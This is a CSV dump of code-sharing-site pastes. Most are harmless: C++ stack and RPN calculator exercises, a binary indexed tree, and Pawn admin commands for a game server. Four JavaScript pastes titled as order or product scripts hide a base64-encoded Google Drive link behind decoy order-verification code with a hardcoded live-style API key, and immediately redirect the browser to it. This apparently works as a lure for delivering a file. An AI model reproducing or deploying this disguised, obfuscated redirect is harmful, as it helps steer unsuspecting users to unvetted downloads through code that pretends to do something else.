id,title,username,language,date,content
NJB20QtR,Products.js,dentira,JavaScript,Thursday 17th of April 2025 07:32:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45486/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GnWPM0ba,Order.js,dentira,JavaScript,Thursday 17th of April 2025 07:16:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/59925/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TQHPX4RD,Untitled,Mikhail-Podbolotov,C++,Thursday 17th of April 2025 07:09:42 AM CDT,"#include <iostream>
#include <string>

// ===== Stack =====
template <typename T>
class Stack {
private:
    struct Node {
        T data;
        Node* next;
        Node(const T& value, Node* nextNode = nullptr)
            : data(value), next(nextNode) {
        }
    };

    Node* topNode;

public:
    Stack() : topNode(nullptr) {}

    ~Stack() {
        while (!isEmpty()) {
            pop();
        }
    }

    void push(const T& value) {
        topNode = new Node(value, topNode);
    }

    void pop() {
        if (isEmpty()) {
            std::cerr << ""Error: Stack is empty, cannot pop.\n"";
            return;
        }
        Node* temp = topNode;
        topNode = topNode->next;
        delete temp;
    }

    T& top() {
        if (isEmpty()) {
            std::cerr << ""Error: Stack is empty.\n"";
            std::exit(1);
        }
        return topNode->data;
    }

    bool isEmpty() const {
        return topNode == nullptr;
    }
};

// ===== Utils =====
bool isNumber(const std::string& s) {
    if (s.empty()) return false;
    size_t start = 0;
    if (s[0] == '-' && s.size() > 1) start = 1;
    for (size_t i = start; i < s.size(); ++i)
        if (s[i] < '0' || s[i] > '9') return false;
    return true;
}

int toInt(const std::string& s) {
    int result = 0;
    bool negative = false;
    size_t i = 0;
    if (s[0] == '-') { negative = true; i = 1; }
    for (; i < s.size(); ++i) result = result * 10 + (s[i] - '0');
    return negative ? -result : result;
}

// ===== RPN Evaluation =====
int evaluateRPN(const std::string& input) {
    Stack<int> stack;
    std::string token = """";

    for (size_t i = 0; i <= input.length(); ++i) {
        char ch = (i < input.length()) ? input[i] : ' ';

        if (ch != ' ') {
            token += ch;
        }
        else if (!token.empty()) {
            if (isNumber(token)) {
                stack.push(toInt(token));
            }
            else if (token == ""+"" || token == ""-"" || token == ""*"" || token == ""/"") {
                if (stack.isEmpty()) return -999999; // Error code
                int b = stack.top(); stack.pop();
                if (stack.isEmpty()) return -999999;
                int a = stack.top(); stack.pop();

                if (token == ""+"") stack.push(a + b);
                else if (token == ""-"") stack.push(a - b);
                else if (token == ""*"") stack.push(a * b);
                else if (token == ""/"") {
                    if (b == 0) return -888888; // Деление на 0
                    stack.push(a / b);
                }
            }
            else {
                std::cerr << ""Unknown token: "" << token << ""\n"";
                return -777777; // Некорректный токен
            }
            token = """";
        }
    }

    if (!stack.isEmpty()) {
        int result = stack.top(); stack.pop();
        if (!stack.isEmpty()) return -666666; // Stack not empty at end — ошибка
        return result;
    }

    return -555555; // Пустой ввод
}

// ===== Stack Test =====
void testStack() {
    std::cout << ""[Stack Test]\n"";
    Stack<int> s;
    s.push(1);
    s.push(2);
    s.push(3);

    if (s.top() == 3) std::cout << ""Top OK\n"";
    else std::cout << ""Top FAIL\n"";

    s.pop();
    if (s.top() == 2) std::cout << ""Pop OK\n"";
    else std::cout << ""Pop FAIL\n"";

    s.pop(); s.pop();
    if (s.isEmpty()) std::cout << ""Empty OK\n"";
    else std::cout << ""Empty FAIL\n"";

    std::cout << ""\n"";
}

// ===== RPN Test =====
void testRPN() {
    std::cout << ""[RPN Test]\n"";

    struct TestCase {
        std::string expr;
        int expected;
    };

    TestCase cases[] = {
        {""3 4 +"", 7},
        {""10 2 * 3 +"", 23},
        {""15 7 1 1 + - / 3 * 2 1 1 + + -"", 5},
        {""5 1 2 + 4 * + 3 -"", 14},
        {""3 0 /"", -888888},  // деление на 0
        {""5 +"", -999999},    // недостаточно операндов
        {""1 2 3 +"", -666666} // лишнее на стеке
    };

    for (int i = 0; i < sizeof(cases) / sizeof(TestCase); ++i) {
        int result = evaluateRPN(cases[i].expr);
        std::cout << ""Test "" << i + 1 << "": "";
        if (result == cases[i].expected)
            std::cout << ""OK"";
        else
            std::cout << ""FAIL (got "" << result << "", expected "" << cases[i].expected << "")"";
        std::cout << ""\n"";
    }

    std::cout << ""\n"";
}

// ===== Main =====
int main() {
    testStack();
    testRPN();

    std::string input;
    std::cout << ""Enter RPN expression (e.g. '3 4 + 2 *'): "";
    std::getline(std::cin, input);

    int result = evaluateRPN(input);
    std::cout << ""Result: "" << result << ""\n"";

    return 0;
}
"
Yj44gVzs,Untitled,Mikhail-Podbolotov,C++,Thursday 17th of April 2025 07:06:33 AM CDT,"//// deepseek 
#include <iostream>

// Шаблонный класс Stack
template <typename T>
class Stack {
private:
    struct Node {
        T data;
        Node* next;
        Node(const T& data, Node* next = nullptr) : data(data), next(next) {}
    };

    Node* topNode;
    size_t stackSize;

public:
    Stack() : topNode(nullptr), stackSize(0) {}

    ~Stack() {
        while (!empty()) {
            pop();
        }
    }

    void push(const T& value) {
        Node* newNode = new Node(value, topNode);
        topNode = newNode;
        stackSize++;
    }

    void pop() {
        if (empty()) {
            std::cerr << ""Error: Stack is empty, cannot pop\n"";
            return;
        }

        Node* temp = topNode;
        topNode = topNode->next;
        delete temp;
        stackSize--;
    }

    T& top() {
        if (empty()) {
            std::cerr << ""Error: Stack is empty, returning garbage value\n"";
            static T garbage;
            return garbage;
        }
        return topNode->data;
    }

    const T& top() const {
        if (empty()) {
            std::cerr << ""Error: Stack is empty, returning garbage value\n"";
            static T garbage;
            return garbage;
        }
        return topNode->data;
    }

    bool empty() const {
        return topNode == nullptr;
    }

    size_t size() const {
        return stackSize;
    }
};

// Вспомогательные функции для калькулятора
bool isDigit(char c) {
    return c >= '0' && c <= '9';
}

double parseNumber(const char*& str) {
    double num = 0;
    bool negative = false;
    bool decimal = false;
    double decimalDivisor = 1.0;

    if (*str == '-') {
        negative = true;
        ++str;
    }

    while (isDigit(*str) || *str == '.') {
        if (*str == '.') {
            decimal = true;
            ++str;
            continue;
        }

        if (decimal) {
            decimalDivisor *= 10;
            num += (*str - '0') / decimalDivisor;
        }
        else {
            num = num * 10 + (*str - '0');
        }
        ++str;
    }

    return negative ? -num : num;
}

// Функция вычисления выражения в ОПН
double evaluateRPN(const char* expression) {
    Stack<double> stack;

    while (*expression != '\0') {
        // Пропускаем пробелы
        if (*expression == ' ') {
            ++expression;
            continue;
        }

        // Если цифра или минус (начало числа)
        if (isDigit(*expression) || (*expression == '-' && isDigit(*(expression + 1)))) {
            stack.push(parseNumber(expression));
        }
        else {
            // Операция
            if (stack.size() < 2) {
                std::cerr << ""Error: Not enough operands for operation\n"";
                return 0;
            }

            double b = stack.top(); stack.pop();
            double a = stack.top(); stack.pop();

            switch (*expression) {
            case '+': stack.push(a + b); break;
            case '-': stack.push(a - b); break;
            case '*': stack.push(a * b); break;
            case '/':
                if (b == 0) {
                    std::cerr << ""Error: Division by zero\n"";
                    return 0;
                }
                stack.push(a / b);
                break;
            default:
                std::cerr << ""Error: Unknown operator '"" << *expression << ""'\n"";
                return 0;
            }
            ++expression;
        }
    }

    if (stack.size() != 1) {
        std::cerr << ""Error: Invalid expression format\n"";
        return 0;
    }

    return stack.top();
}

// Тестирование стека
void testStack() {
    std::cout << ""=== Testing Stack ===\n"";
    Stack<int> s;

    s.push(1);
    s.push(2);
    s.push(3);

    std::cout << ""Top: "" << s.top() << "" (expected 3)\n"";
    s.pop();
    std::cout << ""Top after pop: "" << s.top() << "" (expected 2)\n"";
    std::cout << ""Size: "" << s.size() << "" (expected 2)\n"";
    std::cout << ""Empty: "" << (s.empty() ? ""true"" : ""false"") << "" (expected false)\n"";

    s.pop();
    s.pop();
    std::cout << ""Empty after pops: "" << (s.empty() ? ""true"" : ""false"") << "" (expected true)\n"";

    // Тест на пустом стеке
    s.top(); // Должно вывести ошибку
    s.pop(); // Должно вывести ошибку
}

// Тестирование калькулятора
void testCalculator() {
    std::cout << ""\n=== Testing RPN Calculator ===\n"";

    const char* test1 = ""3 4 +""; // 3 + 4 = 7
    const char* test2 = ""5 1 2 + 4 * +""; // 5 + (1 + 2) * 4 = 17
    const char* test3 = ""10 6 - 2 /""; // (10 - 6) / 2 = 2
    const char* test4 = ""3.5 2 *""; // 3.5 * 2 = 7
    const char* test5 = ""-5 3 +""; // -5 + 3 = -2

    std::cout << test1 << "" = "" << evaluateRPN(test1) << "" (expected 7)\n"";
    std::cout << test2 << "" = "" << evaluateRPN(test2) << "" (expected 17)\n"";
    std::cout << test3 << "" = "" << evaluateRPN(test3) << "" (expected 2)\n"";
    std::cout << test4 << "" = "" << evaluateRPN(test4) << "" (expected 7)\n"";
    std::cout << test5 << "" = "" << evaluateRPN(test5) << "" (expected -2)\n"";

    // Тест ошибок
    std::cout << ""\nTesting errors:\n"";
    evaluateRPN(""1 2 + +""); // Недостаточно операндов
    evaluateRPN(""1 0 /"");   // Деление на ноль
    evaluateRPN(""1 2 &"");   // Неизвестный оператор
}

int main() {
    testStack();
    testCalculator();

    // Интерактивный режим
    std::cout << ""\n=== Interactive RPN Calculator ===\n"";
    std::cout << ""Enter expression (e.g. '3 4 + 2 *'), 'q' to quit\n"";

    char input[256];
    while (true) {
        std::cout << ""> "";
        std::cin.getline(input, sizeof(input));

        if (input[0] == 'q') break;

        double result = evaluateRPN(input);
        std::cout << ""= "" << result << ""\n"";
    }

    return 0;
}"
1BiTbEjL,Untitled,Mikhail-Podbolotov,C++,Thursday 17th of April 2025 07:05:41 AM CDT,"//chatgpt

#include <iostream>
#include <string>

template <typename T>
class Stack {
private:
    struct Node {
        T data;
        Node* next;
        Node(const T& value, Node* nextNode = nullptr)
            : data(value), next(nextNode) {}
    };

    Node* topNode;

public:
    Stack() : topNode(nullptr) {}

    ~Stack() {
        while (!isEmpty()) {
            pop();
        }
    }

    void push(const T& value) {
        topNode = new Node(value, topNode);
    }

    void pop() {
        if (isEmpty()) {
            std::cerr << ""Error: Stack is empty, cannot pop.\n"";
            return;
        }
        Node* temp = topNode;
        topNode = topNode->next;
        delete temp;
    }

    T& top() {
        if (isEmpty()) {
            std::cerr << ""Error: Stack is empty.\n"";
            std::exit(1);
        }
        return topNode->data;
    }

    bool isEmpty() const {
        return topNode == nullptr;
    }
};

// Простейшая проверка: является ли строка числом (включая отрицательные)
bool isNumber(const std::string& s) {
    if (s.empty()) return false;
    size_t start = 0;
    if (s[0] == '-') {
        if (s.size() == 1) return false;
        start = 1;
    }
    for (size_t i = start; i < s.size(); ++i) {
        if (s[i] < '0' || s[i] > '9') return false;
    }
    return true;
}

// Простейший stoi, без std::stoi
int toInt(const std::string& s) {
    int result = 0;
    bool negative = false;
    size_t i = 0;

    if (s[0] == '-') {
        negative = true;
        i = 1;
    }

    for (; i < s.size(); ++i) {
        result = result * 10 + (s[i] - '0');
    }

    return negative ? -result : result;
}

void evaluateRPN(const std::string& input) {
    Stack<int> stack;
    std::string token = """";

    for (size_t i = 0; i <= input.length(); ++i) {
        char ch = (i < input.length()) ? input[i] : ' ';

        if (ch != ' ') {
            token += ch;
        } else if (!token.empty()) {
            if (isNumber(token)) {
                stack.push(toInt(token));
            } else if (token == ""+"" || token == ""-"" || token == ""*"" || token == ""/"") {
                if (stack.isEmpty()) { std::cerr << ""Not enough operands\n""; return; }
                int b = stack.top(); stack.pop();

                if (stack.isEmpty()) { std::cerr << ""Not enough operands\n""; return; }
                int a = stack.top(); stack.pop();

                if (token == ""+"") stack.push(a + b);
                else if (token == ""-"") stack.push(a - b);
                else if (token == ""*"") stack.push(a * b);
                else if (token == ""/"") stack.push(a / b); // Без проверки деления на 0 для простоты
            } else {
                std::cerr << ""Unknown token: "" << token << ""\n"";
                return;
            }
            token = """";
        }
    }

    if (!stack.isEmpty()) {
        std::cout << ""Result: "" << stack.top() << ""\n"";
    } else {
        std::cerr << ""No result on stack\n"";
    }
}

int main() {
    std::string input;
    std::cout << ""Enter RPN expression (e.g. '3 4 + 2 *'): "";
    std::getline(std::cin, input);

    evaluateRPN(input);

    return 0;
}
"
QfBWJEvz,Binary_Index_Tree,Araf_12,C++,Thursday 17th of April 2025 07:05:12 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

const int MAXINDEX = 100005;
int tree[MAXINDEX]; // BIT array

// Point update for BIT (add val to index idx)
void update(int idx, int val) {
    while (idx < MAXINDEX) {
        tree[idx] += val;
        idx += (idx & -idx);
    }
}

// Range update: add val to range [l, r]
void range_update(int l, int r, int val) {
    update(l, val);       // Add val at start
    update(r + 1, -val);  // Remove val after end
}

// Point query: get value at index idx
int point_query(int idx) {
    int res = 0;
    while (idx > 0) {
        res += tree[idx];
        idx -= (idx & -idx);
    }
    return res;
}

// Example usage
int main() {
    // Range updates
    range_update(2, 5, 10);  // add 10 to all elements in [2, 5]
    range_update(4, 7, 5);   // add 5 to all elements in [4, 7]

    // Point queries
    cout << ""Value at index 3: "" << point_query(3) << endl;  // should print 10
    cout << ""Value at index 5: "" << point_query(5) << endl;  // should print 15
    cout << ""Value at index 7: "" << point_query(7) << endl;  // should print 5
    cout << ""Value at index 1: "" << point_query(1) << endl;  // should print 0

    return 0;
}
"
xzwD0TAg,Market.js,dentira,JavaScript,Thursday 17th of April 2025 07:01:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46225/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rT63GkGT,Untitled,dentira,JavaScript,Thursday 17th of April 2025 06:46:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37583/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1mQj8UcB,Skin changer for Stars And Stripes Multtiplayer.,Joey_Simmons,Pawn,Thursday 17th of April 2025 06:41:38 AM CDT,"#include <a_samp>
#include <zcmd>
#include <sscanf2>

CMD:skin(playerid, params[])
{
    if(!IsPlayerAdmin(playerid))
    {
        SendClientMessage(playerid, 0xFF0000FF, ""Error: You must be an RCON admin to use this command!"");
        return 1;
    }

    new skinid;
    if(sscanf(params, ""i"", skinid))
    {
        SendClientMessage(playerid, 0xFFFF00FF, ""Usage: /skin [skin_id]"");
        SendClientMessage(playerid, 0xFFFF00FF, ""Valid IDs: 11754-12799, 13891-14257"");
        return 1;
    }

    new bool:isValid = (skinid >= 11754 && skinid <= 12799) || (skinid >= 13891 && skinid <= 14257);
    switch(isValid)
    {
        case true:
        {
            SetPlayerSkin(playerid, skinid);
            new string[128];
            format(string, sizeof(string), ""You have changed your skin to ID %d."", skinid);
            SendClientMessage(playerid, 0x00FF00FF, string);
        }
        case false:
        {
            SendClientMessage(playerid, 0xFF0000FF, ""Error: Invalid skin ID! Valid IDs: 11754-12799, 13891-14257"");
        }
    }

    return 1;
}"
xhT9YYt2,Weapons in Stars And Stripes Multiplayer.,Joey_Simmons,Pawn,Thursday 17th of April 2025 06:33:56 AM CDT,"#include <a_samp>
#include <sscanf2>
#include <zcmd>

CMD:weapon(playerid, params[])
{
    if(!IsPlayerAdmin(playerid))
    {
        SendClientMessage(playerid, 0xFF0000FF, ""Error: You must be an RCON admin to use this command!"");
        return 1;
    }

    new weaponid;
    if(sscanf(params, ""i"", weaponid))
    {
        SendClientMessage(playerid, 0xFFFF00FF, ""Usage: /weapon [weapon_id]"");
        SendClientMessage(playerid, 0xFFFF00FF, ""Valid IDs: 70-92, 99-175"");
        return 1;
    }

    new bool:isValid = (weaponid >= 70 && weaponid <= 92) || (weaponid >= 99 && weaponid <= 175);
    switch(isValid)
    {
        case true:
        {
            GivePlayerWeapon(playerid, weaponid, 100);
            new string[128];
            format(string, sizeof(string), ""You have received weapon ID %d."", weaponid);
            SendClientMessage(playerid, 0x00FF00FF, string);
        }
        case false:
        {
            SendClientMessage(playerid, 0xFF0000FF, ""Error: Invalid weapon ID! Valid IDs: 70-92, 99-175"");
        }
    }

    return 1;
}"
